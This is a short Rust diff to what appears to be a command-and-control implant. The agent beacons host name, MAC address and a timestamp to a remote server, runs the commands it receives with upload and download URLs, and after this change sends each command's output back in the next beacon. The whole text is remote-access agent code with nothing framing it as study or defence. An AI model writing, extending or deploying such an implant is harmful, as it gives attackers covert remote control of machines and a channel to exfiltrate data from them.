@@ -9,6 +9,7 @@ use crate::commands::execute::execute_command;
 
 #[derive(Serialize)]
 struct Beacon {
+    command_output: String,
     timestamp: u64,
     host_name: String,
     mac_addr: String,
@@ -26,12 +27,16 @@ pub async fn run(
     let client = Client::new();
     let mut sys = System::new_all();
 
+    // Default command output
+    let mut command_output = String::new();
+
     loop {
         // Refresh system information
         sys.refresh_all();
 
         // Create a new beacon with updated information
         let beacon = Beacon {
+            command_output: command_output.clone(),
             timestamp: chrono::Utc::now().timestamp() as u64,
             host_name: System::host_name().unwrap_or_default(),
             mac_addr: mac_addr.clone(),
@@ -53,7 +58,10 @@ pub async fn run(
                             println!("Executing command: {}", cmd);
                             // Execute the received command
                             match execute_command(uuid, cmd, upload_url, download_url).await {
-                                Ok(_) => println!("Command executed successfully."),
+                                Ok(output) => {
+                                    println!("Command executed successfully.");
+                                    command_output = output;
+                                }
                                 Err(e) => println!("Command execution failed: {}", e),
                             }
                         }
